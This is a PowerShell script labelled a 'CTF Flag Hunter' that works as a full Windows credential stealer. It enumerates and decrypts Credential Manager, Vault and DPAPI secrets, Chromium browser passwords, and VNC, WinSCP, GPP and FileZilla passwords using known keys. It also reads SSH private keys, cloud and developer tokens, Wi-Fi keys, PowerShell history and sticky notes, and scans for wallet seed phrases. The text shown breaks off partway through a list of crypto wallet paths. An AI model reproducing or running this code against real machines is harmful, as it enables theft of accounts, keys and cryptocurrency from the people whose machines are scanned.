#Requires -Version 5.1
<#
.SYNOPSIS
    CTF Flag Hunter — full credential dump with decryption
.DESCRIPTION
    Assumes everything found is a flag. Decrypts where possible:
    Chrome/Edge AES-GCM, VNC DES, WinSCP XOR, GPP AES, DPAPI, Unattend Base64.
    Prints every credential, key, seed phrase, and stored secret with its exact source.
.USAGE
    .\Find-Flags.ps1
    .\Find-Flags.ps1 -OutFile results.txt
    .\Find-Flags.ps1 -Deep      # also string-scan binary blobs
#>

param(
    [string]$OutFile = "",
    [switch]$Deep
)

Set-StrictMode -Off
$ErrorActionPreference = "SilentlyContinue"

# ── Output ─────────────────────────────────────────────────────────────────────
$FINDS = [System.Collections.Generic.List[string]]::new()
$SEP   = "-" * 72
$SEP2  = "=" * 72

function Emit([string]$Section, [string]$Location, [string]$Value, [string]$Note = "") {
    $lines = @("$SEP", "[$Section]", "  Source : $Location", "  Value  : $Value")
    if ($Note) { $lines += "  Note   : $Note" }
    $block = $lines -join "`n"
    Write-Host $block
    $FINDS.Add($block)
}

function Header([string]$Title) {
    $h = "`n$SEP2`n  $Title`n$SEP2"
    Write-Host $h -ForegroundColor Cyan
    $FINDS.Add($h)
}

function ReadText([string]$Path, [int]$Max = 262144) {
    try {
        if (-not (Test-Path $Path -PathType Leaf)) { return $null }
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        $len   = [Math]::Min($bytes.Length, $Max)
        return [System.Text.Encoding]::UTF8.GetString($bytes, 0, $len)
    } catch { return $null }
}

function ReadBytes([string]$Path, [int]$Max = 4194304) {
    try {
        if (-not (Test-Path $Path -PathType Leaf)) { return $null }
        $fs    = [System.IO.File]::OpenRead($Path)
        $len   = [Math]::Min($fs.Length, $Max)
        $buf   = [byte[]]::new($len)
        $null  = $fs.Read($buf, 0, $len)
        $fs.Close()
        return $buf
    } catch { return $null }
}

function CopyTemp([string]$Path) {
    try {
        $dst = [System.IO.Path]::GetTempFileName() + "_ctf"
        Copy-Item $Path $dst -Force
        return $dst
    } catch { return $null }
}

# ── DPAPI ──────────────────────────────────────────────────────────────────────
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class DPAPI {
    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    [DllImport("crypt32.dll",SetLastError=true)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder szDataDescr,
        IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

    [DllImport("kernel32.dll")] public static extern IntPtr LocalFree(IntPtr hMem);

    public static byte[] Decrypt(byte[] data) {
        var inp = new DATA_BLOB { cbData = data.Length,
            pbData = Marshal.AllocHGlobal(data.Length) };
        Marshal.Copy(data, 0, inp.pbData, data.Length);
        var out_ = new DATA_BLOB();
        try {
            if (CryptUnprotectData(ref inp, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref out_)) {
                var result = new byte[out_.cbData];
                Marshal.Copy(out_.pbData, result, 0, out_.cbData);
                LocalFree(out_.pbData);
                return result;
            }
        } catch {}
        finally { Marshal.FreeHGlobal(inp.pbData); }
        return null;
    }

    public static string DecryptStr(byte[] data) {
        var raw = Decrypt(data);
        if (raw == null) return "(DPAPI failed — run as owning user)";
        try { return Encoding.Unicode.GetString(raw); }
        catch { try { return Encoding.UTF8.GetString(raw); } catch { return BitConverter.ToString(raw); } }
    }
}
'@ -ErrorAction SilentlyContinue

function Invoke-DPAPI([byte[]]$Data) {
    try { return [DPAPI]::Decrypt($Data) } catch { return $null }
}
function Invoke-DPAPIStr([byte[]]$Data) {
    try { return [DPAPI]::DecryptStr($Data) } catch { return "(dpapi error)" }
}

# ── AES-GCM (Chrome/Edge) ──────────────────────────────────────────────────────
function Decrypt-AesGcm([byte[]]$Key, [byte[]]$Ciphertext) {
    # ciphertext = b"v10" + nonce(12) + data + tag(16)
    try {
        $nonce   = $Ciphertext[3..14]
        $payload = $Ciphertext[15..($Ciphertext.Length-17)]
        $tag     = $Ciphertext[($Ciphertext.Length-16)..($Ciphertext.Length-1)]

        Add-Type -AssemblyName System.Security
        # .NET doesn't have AES-GCM before .NET 5 — use BouncyCastle if available or return raw
        try {
            $aesGcm  = [System.Security.Cryptography.AesGcm]::new([byte[]]$Key)
            $plain   = [byte[]]::new($payload.Length)
            $aesGcm.Decrypt([byte[]]$nonce, [byte[]]$payload, [byte[]]$tag, $plain)
            return [System.Text.Encoding]::UTF8.GetString($plain)
        } catch {
            # Fallback: try via OpenSSL subprocess
            return "(AES-GCM requires .NET 5+ or run find_flags.py with pycryptodome)"
        }
    } catch { return "(aes-gcm error: $_)" }
}

function Get-ChromeMasterKey([string]$UserDataDir) {
    try {
        $ls  = Get-Content "$UserDataDir\Local State" -Raw | ConvertFrom-Json
        $enc = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
        $enc = $enc[5..($enc.Length-1)]   # strip 'DPAPI' prefix
        return Invoke-DPAPI $enc
    } catch { return $null }
}

function Decrypt-ChromePassword([byte[]]$Blob, [byte[]]$MasterKey) {
    if (-not $Blob -or $Blob.Length -lt 3) { return "" }
    $prefix = [System.Text.Encoding]::ASCII.GetString($Blob[0..2])
    if ($prefix -in "v10","v11","v20") {
        if ($MasterKey) { return Decrypt-AesGcm $MasterKey $Blob }
        return "(no master key) raw=$([BitConverter]::ToString($Blob[0..15]))"
    }
    return Invoke-DPAPIStr $Blob
}

# ── VNC DES decrypt ────────────────────────────────────────────────────────────
function Decrypt-VNC([object]$HexOrBytes) {
    try {
        Add-Type -AssemblyName System.Security
        $vncKey = [byte[]](0xe8,0x4a,0xd6,0x60,0xc4,0x72,0x1a,0xe0)
        if ($HexOrBytes -is [string]) {
            $enc = [byte[]]($HexOrBytes -replace ' ','' | foreach { [Convert]::ToByte($_, 16) } )
            # Actually parse hex pairs:
            $hex = $HexOrBytes -replace '\s',''
            $enc = [byte[]](0..([int]($hex.Length/2)-1) | ForEach-Object { [Convert]::ToByte($hex.Substring($_*2,2),16) })
        } else { $enc = [byte[]]$HexOrBytes }
        $des        = [System.Security.Cryptography.DESCryptoServiceProvider]::new()
        $des.Key    = $vncKey
        $des.IV     = [byte[]]::new(8)
        $des.Mode   = [System.Security.Cryptography.CipherMode]::ECB
        $des.Padding= [System.Security.Cryptography.PaddingMode]::None
        $dec        = $des.CreateDecryptor().TransformFinalBlock($enc, 0, [Math]::Min($enc.Length,8))
        return [System.Text.Encoding]::ASCII.GetString($dec).TrimEnd([char]0)
    } catch { return "(vnc decrypt error: $_)" }
}

# ── WinSCP XOR decrypt ─────────────────────────────────────────────────────────
function Decrypt-WinSCP([string]$Password, [string]$Host = "", [string]$User = "") {
    try {
        $MAGIC = 0xA3; $FLAG = 0xFF
        $hex   = $Password.Trim()
        $nibbles = $hex.ToCharArray() | ForEach-Object { [Convert]::ToInt32([string]$_, 16) }
        $i     = 0
        function ReadByte {
            $b = $MAGIC -bxor ($nibbles[$i] -shl 4 -bor $nibbles[$i+1])
            $script:i += 2
            return (-bnot $b) -band 0xFF
        }
        $flag  = ReadByte
        if ($flag -eq $FLAG) { $null = ReadByte; $length = ReadByte } else { $length = $flag }
        $null = ReadByte; $null = ReadByte  # skip 2
        $result = ""
        for ($j = 0; $j -lt $length; $j++) { $result += [char](ReadByte) }
        $prefix = "$Host$User"
        if ($prefix -and $result.StartsWith($prefix)) { $result = $result.Substring($prefix.Length) }
        return $result
    } catch { return "(winscp error: $_) raw=$Password" }
}

# ── GPP cpassword ──────────────────────────────────────────────────────────────
$GPP_KEY = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

function Decrypt-GPP([string]$CPassword) {
    try {
        $pad    = (4 - $CPassword.Length % 4) % 4
        $enc    = [Convert]::FromBase64String($CPassword + "=" * $pad)
        $aes    = [System.Security.Cryptography.AesCryptoServiceProvider]::new()
        $aes.Key     = $GPP_KEY
        $aes.IV      = [byte[]]::new(16)
        $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $dec    = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
        return [System.Text.Encoding]::Unicode.GetString($dec)
    } catch { return "(gpp decrypt error: $_)" }
}

# ── Seed phrase detection ──────────────────────────────────────────────────────
function Find-SeedPhrases([string]$Text, [string]$Location) {
    $matches_ = [regex]::Matches($Text, '(?<![a-z])([a-z]{3,8}(?:[ \t][a-z]{3,8}){11,23})(?![a-z])')
    foreach ($m in $matches_) {
        $words = $m.Value -split '\s+'
        if ($words.Count -in 12,15,18,21,24) {
            Emit "SeedPhrase" $Location $m.Value "$($words.Count)-word mnemonic — possible wallet seed"
        }
    }
}

# ── Printable strings from binary ──────────────────────────────────────────────
function Get-BinaryStrings([byte[]]$Data, [int]$MinLen = 8) {
    $result = [System.Collections.Generic.List[string]]::new()
    $cur    = [System.Text.StringBuilder]::new()
    foreach ($b in $Data) {
        if ($b -ge 0x20 -and $b -le 0x7e) { $null = $cur.Append([char]$b) }
        else {
            if ($cur.Length -ge $MinLen) { $result.Add($cur.ToString()) }
            $null = $cur.Clear()
        }
    }
    if ($cur.Length -ge $MinLen) { $result.Add($cur.ToString()) }
    return $result
}

# ══════════════════════════════════════════════════════════════════════════════
# SCAN MODULES
# ══════════════════════════════════════════════════════════════════════════════

# ── 1. Windows Credential Manager ─────────────────────────────────────────────
function Scan-CredMan {
    Header "WINDOWS CREDENTIAL MANAGER"
    Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices; using System.Text;
public class CredMan2 {
    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
    public struct CREDENTIAL {
        public uint Flags, Type;
        public string TargetName, Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist, AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias, UserName;
    }
    [DllImport("advapi32.dll",CharSet=CharSet.Unicode,SetLastError=true)]
    public static extern bool CredEnumerate(string f,uint fl,out uint cnt,out IntPtr creds);
    [DllImport("advapi32.dll")] public static extern void CredFree(IntPtr p);
    public static string[][] Enumerate() {
        var list = new System.Collections.Generic.List<string[]>();
        uint n=0; IntPtr p=IntPtr.Zero;
        if(CredEnumerate(null,0,out n,out p)){
            for(int i=0;i<n;i++){
                var c=(CREDENTIAL)Marshal.PtrToStructure(Marshal.ReadIntPtr(p,i*IntPtr.Size),typeof(CREDENTIAL));
                string pw="";
                if(c.CredentialBlobSize>0&&c.CredentialBlob!=IntPtr.Zero){
                    var b=new byte[c.CredentialBlobSize];
                    Marshal.Copy(c.CredentialBlob,b,0,(int)c.CredentialBlobSize);
                    try{pw=Encoding.Unicode.GetString(b);}catch{pw=BitConverter.ToString(b);}
                }
                list.Add(new[]{c.TargetName??"",(c.UserName??""),(pw),(c.Type.ToString())});
            }
            CredFree(p);
        }
        return list.ToArray();
    }
}
'@ -ErrorAction SilentlyContinue
    try {
        foreach ($c in [CredMan2]::Enumerate()) {
            Emit "CredManager" "Target=$($c[0])" "Username=$($c[1])  |  Password=$($c[2])" "Type=$($c[3])"
            Find-SeedPhrases $c[2] "CredManager:$($c[0])"
        }
    } catch { Write-Host "  [!] CredMan error: $_" }
}

# ── 2. Windows Vault ──────────────────────────────────────────────────────────
function Scan-Vault {
    Header "WINDOWS VAULT"
    $out = vaultcmd /listcreds:"{Windows Credentials}" /all 2>&1
    $out + (vaultcmd /listcreds:"{Web Credentials}" /all 2>&1) |
    Where-Object { $_ -match '\S' -and $_ -notmatch '^Vault|^Currently' } |
    ForEach-Object { Emit "Vault-vaultcmd" "vaultcmd" $_.Trim() }

    foreach ($root in @("$env:LOCALAPPDATA\Microsoft\Vault","$env:APPDATA\Microsoft\Vault")) {
        Get-ChildItem $root -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer -and $_.Length -lt 102400 } |
        ForEach-Object {
            $raw = ReadBytes $_.FullName
            if ($raw) {
                $dec = Invoke-DPAPI $raw
                if ($dec) {
                    $val = try { [Text.Encoding]::Unicode.GetString($dec) } catch { [Text.Encoding]::UTF8.GetString($dec) }
                    Emit "Vault-DPAPI" $_.FullName $val
                    Find-SeedPhrases $val $_.FullName
                } else {
                    Get-BinaryStrings $raw | ForEach-Object { Emit "Vault-Str" $_.FullName $_ }
                }
            }
        }
    }
}

# ── 3. Registry credentials ────────────────────────────────────────────────────
function Scan-Registry {
    Header "REGISTRY CREDENTIALS"

    function RegVal([string]$Path, [string]$Name) {
        try { return (Get-ItemProperty -Path $Path -Name $Name).$Name } catch { return $null }
    }

    # AutoLogon
    $wl = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    foreach ($n in @("DefaultPassword","AltDefaultPassword")) {
        $v = RegVal $wl $n
        if ($v) {
            $u = RegVal $wl "DefaultUserName"
            Emit "AutoLogon" "$wl\$n" $v "User=$u"
            Find-SeedPhrases $v "AutoLogon"
        }
    }

    # VNC (DES encrypted with known key)
    @(
        "HKLM:\SOFTWARE\RealVNC\vncserver",
        "HKLM:\SOFTWARE\TigerVNC\WinVNC4",
        "HKLM:\SOFTWARE\ORL\WinVNC3",
        "HKCU:\Software\ORL\WinVNC3",
        "HKLM:\SOFTWARE\TightVNC\Server"
    ) | ForEach-Object {
        $path = $_
        foreach ($n in @("Password","PasswordViewOnly")) {
            $v = RegVal $path $n
            if ($v) {
                $dec = Decrypt-VNC $v
                Emit "VNC-Password" "$path\$n" $dec "raw=$v"
            }
        }
    }

    # PuTTY saved sessions
    if (Test-Path "HKCU:\Software\SimonTatham\PuTTY\Sessions") {
        Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" |
        ForEach-Object {
            $p    = Get-ItemProperty $_.PSPath
            $host = $p.HostName; $user = $p.UserName; $key = $p.PublicKeyFile; $pw = $p.ProxyPassword
            if ($host -or $user -or $key -or $pw) {
                Emit "PuTTY" $_.PSPath "Host=$host  User=$user  ProxyPass=$pw  Key=$key"
            }
        }
    }

    # WinSCP saved sessions (XOR obfuscated)
    if (Test-Path "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions") {
        Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" |
        ForEach-Object {
            $p    = Get-ItemProperty $_.PSPath
            $host = $p.HostName; $user = $p.UserName; $pw = $p.Password
            if ($pw) {
                $dec = Decrypt-WinSCP $pw $host $user
                Emit "WinSCP" $_.PSPath "Host=$host  User=$user  Password=$dec" "raw=$pw"
            }
        }
    }

    # mRemoteNG
    $mremote = "$env:APPDATA\mRemoteNG\confCons.xml"
    $content = ReadText $mremote
    if ($content) {
        [regex]::Matches($content, 'Username="([^"]+)"[^>]*Password="([^"]+)"') | ForEach-Object {
            Emit "mRemoteNG" $mremote "User=$($_.Groups[1].Value)  Pass=$($_.Groups[2].Value)" `
                 "AES-128-CBC with default key 'mR3m' if not changed"
        }
    }

    # Broad CTF-targeted key paths
    foreach ($path in @(
        "HKLM:\SOFTWARE\CTF","HKCU:\Software\CTF",
        "HKLM:\SOFTWARE\Flags","HKCU:\Software\Flags",
        "HKLM:\SOFTWARE\Challenge","HKCU:\Software\Challenge"
    )) {
        if (Test-Path $path) {
            Get-ItemProperty $path | Select-Object -Property * -ExcludeProperty PS* |
            Get-Member -MemberType NoteProperty | ForEach-Object {
                $val = (Get-ItemProperty $path).$($_.Name)
                Emit "Registry-CTF" "$path\$($_.Name)" "$val"
                Find-SeedPhrases "$val" "$path\$($_.Name)"
            }
        }
    }
}

# ── 4. Chrome / Edge / Brave (AES-GCM decryption) ─────────────────────────────
function Scan-ChromiumBrowsers {
    Header "CHROMIUM BROWSER SAVED PASSWORDS (decrypted)"
    $browsers = @(
        @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data";    Name="Chrome"},
        @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data";   Name="Edge"},
        @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Name="Brave"},
        @{Path="$env:APPDATA\Opera Software\Opera Stable";     Name="Opera"},
        @{Path="$env:LOCALAPPDATA\Vivaldi\User Data";          Name="Vivaldi"}
    )

    foreach ($b in $browsers) {
        if (-not (Test-Path $b.Path)) { continue }
        $masterKey = Get-ChromeMasterKey $b.Path

        $profileDirs = @(Join-Path $b.Path "Default") +
                       (Get-ChildItem $b.Path -Filter "Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object FullName)

        foreach ($profileDir in $profileDirs) {
            $dbPath = Join-Path $profileDir "Login Data"
            if (-not (Test-Path $dbPath)) { continue }
            $tmp = CopyTemp $dbPath
            if (-not $tmp) { continue }
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;") 2>$null
                if (-not $conn) {
                    # Use PInvoke SQLite if available, otherwise raw string scan
                    $raw = ReadBytes $dbPath
                    if ($raw) {
                        $strs = Get-BinaryStrings $raw
                        foreach ($s in $strs) {
                            if ($s -match 'http|pass|user|@') {
                                Emit "Browser-$($b.Name)-Str" $dbPath $s "raw string from Login Data"
                            }
                        }
                    }
                    continue
                }
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                $reader = $cmd.ExecuteReader()
                while ($reader.Read()) {
                    $url  = $reader.GetString(0)
                    $user = $reader.GetString(1)
                    $blob = [byte[]]::new($reader.GetBytes(2, 0, $null, 0, 0))
                    $null = $reader.GetBytes(2, 0, $blob, 0, $blob.Length)
                    $pw   = Decrypt-ChromePassword $blob $masterKey
                    Emit "Browser-$($b.Name)" "$dbPath [$([System.IO.Path]::GetFileName($profileDir))]" `
                         "URL=$url  |  User=$user  |  Pass=$pw"
                    Find-SeedPhrases $pw "Browser-$($b.Name)"
                }
                $conn.Close()
            } catch {
                # SQLite .NET assembly not available — use python subprocess or raw strings
                $raw = ReadBytes $dbPath
                if ($raw) {
                    $strs = Get-BinaryStrings $raw
                    foreach ($s in $strs) {
                        if ($s.Length -gt 8 -and $s -match 'http|\.com|\.org') {
                            Emit "Browser-$($b.Name)-Str" $dbPath $s "raw string (SQLite lib missing)"
                        }
                    }
                }
            } finally {
                Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            }
        }
    }

    # Better fallback: use Python to decrypt if available
    if (Get-Command python -ErrorAction SilentlyContinue) {
        Write-Host "  [i] Python available — run: python find_flags.py --out results.txt" -ForegroundColor Yellow
        Write-Host "      Python version has full AES-GCM Chrome decryption via pycryptodome" -ForegroundColor Yellow
    }
}

# ── 5. Firefox ────────────────────────────────────────────────────────────────
function Scan-Firefox {
    Header "FIREFOX SAVED PASSWORDS"
    $ffRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (-not (Test-Path $ffRoot)) { return }
    Get-ChildItem $ffRoot -Directory | ForEach-Object {
        $lj = Join-Path $_.FullName "logins.json"
        if (-not (Test-Path $lj)) { return }
        try {
            $data = Get-Content $lj -Raw | ConvertFrom-Json
            foreach ($login in $data.logins) {
                Emit "Firefox" $lj "URL=$($login.hostname)  |  User=$($login.encryptedUsername)  |  Pass=$($login.encryptedPassword)" `
                     "NSS encrypted — decrypt with: python firefox_decrypt.py"
            }
        } catch { Emit "Firefox" $lj "(parse error: $_)" }
    }
}

# ── 6. GPP cpassword ──────────────────────────────────────────────────────────
function Scan-GPP {
    Header "GROUP POLICY PREFERENCES — cpassword (MS14-025)"
    $roots   = @("C:\Windows\SYSVOL","C:\Windows\Panther")
    $domain  = $env:USERDNSDOMAIN
    if ($domain) { $roots += "\\$domain\SYSVOL" }
    $gppFiles = "Groups.xml","Services.xml","ScheduledTasks.xml","DataSources.xml","Printers.xml"

    foreach ($root in $roots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($fname in $gppFiles) {
            Get-ChildItem $root -Filter $fname -Recurse -ErrorAction SilentlyContinue |
            ForEach-Object {
                $content = ReadText $_.FullName
                [regex]::Matches($content, 'cpassword="([^"]+)"', 'IgnoreCase') | ForEach-Object {
                    $cpw  = $_.Groups[1].Value
                    $user = if ($content -match 'userName="([^"]+)"') { $Matches[1] } else { "" }
                    $plain = Decrypt-GPP $cpw
                    Emit "GPP-cpassword" $_.FullName "User=$user  |  Password=$plain" "cpassword=$cpw"
                    Find-SeedPhrases $plain $_.FullName
                }
            }
        }
    }
}

# ── 7. Unattend / Sysprep ─────────────────────────────────────────────────────
function Scan-Unattend {
    Header "UNATTEND / SYSPREP"
    @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\unattended.xml",
        "C:\Windows\system32\sysprep\unattend.xml",
        "C:\unattend.xml","C:\autounattend.xml"
    ) | ForEach-Object {
        $content = ReadText $_
        if (-not $content) { return }
        # Raw value nodes
        [regex]::Matches($content, '<Value>([^<]+)</Value>', 'IgnoreCase') | ForEach-Object {
            $val = $_.Groups[1].Value.Trim()
            Emit "Unattend-Raw" $_ $val
            try {
                $dec = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($val))
                Emit "Unattend-Decoded" $_ $dec "Base64+UTF-16LE"
                Find-SeedPhrases $dec $_
            } catch {}
        }
    }
}

# ── 8. SSH ────────────────────────────────────────────────────────────────────
function Scan-SSH {
    Header "SSH KEYS / CONFIG"
    @("$env:USERPROFILE\.ssh","C:\ProgramData\ssh") | ForEach-Object {
        if (-not (Test-Path $_)) { return }
        Get-ChildItem $_ -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer -and $_.Length -lt 65536 } |
        ForEach-Object {
            $content = ReadText $_.FullName
            if (-not $content) { return }
            if ($content -match 'PRIVATE KEY') {
                Emit "SSH-PrivateKey" $_.FullName $content.Substring(0,[Math]::Min($content.Length,2000)) "Private key"
                Find-SeedPhrases $content $_.FullName
            }
            if ($_.Name -eq "config") {
                $content -split "`n" | Where-Object { $_ -match '(?i)(Host |User |IdentityFile|Password)' } |
                ForEach-Object { Emit "SSH-Config" $_.FullName $_.Trim() }
            }
        }
    }
}

# ── 9. Developer credential files ─────────────────────────────────────────────
function Scan-DevCreds {
    Header "DEVELOPER TOOL CREDENTIALS"
    $files = @(
        @{P="$env:USERPROFILE\.git-credentials";         N="Git HTTP credentials"},
        @{P="$env:USERPROFILE\.gitconfig";               N="Git config"},
        @{P="$env:USERPROFILE\.npmrc";                   N="NPM auth token"},
        @{P="$env:USERPROFILE\.netrc";                   N=".netrc"},
        @{P="$env:USERPROFILE\.docker\config.json";      N="Docker Hub"},
        @{P="$env:APPDATA\GitHub CLI\hosts.yml";         N="GitHub CLI token"},
        @{P="$env:USERPROFILE\.aws\credentials";         N="AWS keys"},
        @{P="$env:USERPROFILE\.aws\config";              N="AWS config"},
        @{P="$env:APPDATA\gcloud\application_default_credentials.json"; N="GCP ADC"},
        @{P="$env:USERPROFILE\.azure\accessTokens.json"; N="Azure tokens"},
        @{P="$env:USERPROFILE\.kube\config";             N="Kubernetes credentials"},
        @{P="$env:USERPROFILE\.config\rclone\rclone.conf"; N="rclone"}
    )
    foreach ($f in $files) {
        $content = ReadText $f.P
        if (-not $content) { continue }
        $content -split "`n" | Where-Object { $_ -match '(?i)(pass|secret|key|token|auth|cred|aws_|access)' } |
        ForEach-Object {
            Emit "DevCreds" $f.P $_.Trim() $f.N
            Find-SeedPhrases $_ $f.P
        }
    }

    # .env files
    @("$env:USERPROFILE","C:\projects","C:\dev","C:\inetpub") | ForEach-Object {
        if (-not (Test-Path $_)) { return }
        Get-ChildItem $_ -Recurse -Force -Filter ".env" -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -lt 65536 } |
        ForEach-Object {
            ReadText $_.FullName | ForEach-Object {
                $_ -split "`n" | Where-Object { $_ -match '=' -and $_ -notmatch '^#' } |
                ForEach-Object {
                    Emit "DotEnv" $_.FullName $_.Trim()
                    Find-SeedPhrases $_ $_.FullName
                }
            }
        }
    }
}

# ── 10. PowerShell history ────────────────────────────────────────────────────
function Scan-PSHistory {
    Header "POWERSHELL HISTORY"
    @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"
    ) | ForEach-Object {
        $content = ReadText $_ 524288
        if (-not $content) { return }
        $i = 0
        $content -split "`n" | ForEach-Object {
            $i++
            if ($_ -match '(?i)(password|pass|secret|token|key|cred|-p |--pass|securestring)') {
                Emit "PSHistory" "$_`:line $i" $_.Trim()
                Find-SeedPhrases $_ "$_`:line $i"
            }
        }
    }
}

# ── 11. Sticky Notes ──────────────────────────────────────────────────────────
function Scan-StickyNotes {
    Header "STICKY NOTES"
    $sqlite = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    $snt    = "$env:APPDATA\Microsoft\Sticky Notes\StickyNotes.snt"

    if (Test-Path $sqlite) {
        $tmp = CopyTemp $sqlite
        if ($tmp) {
            try {
                # Try reading with SQLite — fall back to string extraction
                $raw = ReadBytes $sqlite
                if ($raw) {
                    $strs = Get-BinaryStrings $raw
                    foreach ($s in $strs) {
                        if ($s.Length -gt 6) {
                            Emit "StickyNotes" $sqlite $s
                            Find-SeedPhrases $s $sqlite
                        }
                    }
                }
            } finally { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
        }
    }
    if (Test-Path $snt) {
        $content = ReadText $snt
        if ($content) {
            Emit "StickyNotes" $snt $content.Substring(0,[Math]::Min($content.Length,2000))
            Find-SeedPhrases $content $snt
        }
    }
}

# ── 12. Wi-Fi profiles ────────────────────────────────────────────────────────
function Scan-WiFi {
    Header "WI-FI SAVED PASSWORDS"
    $root = "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"
    if (-not (Test-Path $root)) { return }
    Get-ChildItem $root -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $content = ReadText $_.FullName
        if (-not $content) { return }
        $ssid = if ($content -match '<name>([^<]+)</name>') { $Matches[1] } else { $_.BaseName }
        [regex]::Matches($content, '<keyMaterial>([^<]+)</keyMaterial>', 'IgnoreCase') | ForEach-Object {
            Emit "WiFi" $_.FullName "SSID=$ssid  Key=$($_.Groups[1].Value)"
            Find-SeedPhrases $_.Groups[1].Value $_.FullName
        }
    }
}

# ── 13. DPAPI credential files ────────────────────────────────────────────────
function Scan-DPAPI {
    Header "DPAPI CREDENTIAL FILES"
    @("$env:LOCALAPPDATA\Microsoft\Credentials","$env:APPDATA\Microsoft\Credentials") |
    ForEach-Object {
        Get-ChildItem $_ -Force -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer -and $_.Length -lt 102400 } |
        ForEach-Object {
            $raw = ReadBytes $_.FullName
            if (-not $raw) { return }
            $dec = Invoke-DPAPI $raw
            if ($dec) {
                $strs = Get-BinaryStrings $dec
                foreach ($s in $strs) {
                    if ($s.Length -gt 5) {
                        Emit "DPAPI-Cred" $_.FullName $s
                        Find-SeedPhrases $s $_.FullName
                    }
                }
            } else {
                Emit "DPAPI-Cred" $_.FullName "(cannot decrypt — $($raw.Length) bytes)" `
                     "Use mimikatz dpapi::cred /in:$($_.FullName)"
            }
        }
    }
}

# ── 14. FileZilla / FTP ───────────────────────────────────────────────────────
function Scan-FTPClients {
    Header "FTP CLIENT CREDENTIALS"
    @("recentservers.xml","sitemanager.xml","filezilla.xml") | ForEach-Object {
        $content = ReadText "$env:APPDATA\FileZilla\$_"
        if (-not $content) { return }
        [regex]::Matches($content, '<(Host|Port|User|Pass)[^>]*>([^<]+)<', 'IgnoreCase') | ForEach-Object {
            $tag = $_.Groups[1].Value; $val = $_.Groups[2].Value
            Emit "FileZilla" "$env:APPDATA\FileZilla\$_" "$tag=$val"
            if ($tag -eq "Pass") {
                try {
                    $dec = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($val))
                    Emit "FileZilla-Decoded" "$env:APPDATA\FileZilla\$_" $dec "Base64 decoded"
                    Find-SeedPhrases $dec "$env:APPDATA\FileZilla\$_"
                } catch {}
            }
        }
    }
}

# ── 15. Crypto wallets ────────────────────────────────────────────────────────
function Scan-CryptoWallets {
    Header "CRYPTO WALLETS"

    $wallets = @(
        # Core clients
        @{P="$env:APPDATA\Bitcoin\wallet.dat";           N="Bitcoin Core"},
        @{P="$env:APPDATA\Bitcoin\wallets";              N="Bitcoin Core dir"},
        @{P="$env:APPDATA\Litecoin\wallet.dat";          N="Litecoin"},
        @{P="$env:APPDATA\Dogecoin\wallet.dat";          N="Dogecoin"},
        @{P="$env:APPDATA\Dash\wallet.dat";              N="Dash"},
        @{P="$env:APPDATA\Zcash\wallet.dat";             N="Zcash"},
        @{P="$env:APPDATA\Namecoin\wallet.dat";          N="Namecoin"},
        @{P="$env:APPDATA\Ravencoin\wallet.dat";         N="Ravencoin"},
        @{P="$env:APPDATA\Vertcoin\wallet.dat";          N="Vertcoin"},
        # Ethereum
        @{P="$env:APPDATA\Ethereum\keystore";            N="Ethereum Geth keystore"},
        @{P="$env:USERPROFILE\.ethereum\keystore";       N="Ethereum keystore"},
        @{P="$env:APPDATA\Parity\ethereum\keys";         N="Parity/OpenEthereum"},
        # Software wallets
        @{P="$env:APPDATA\Electrum\wallets";             N="Electrum Bitcoin"},
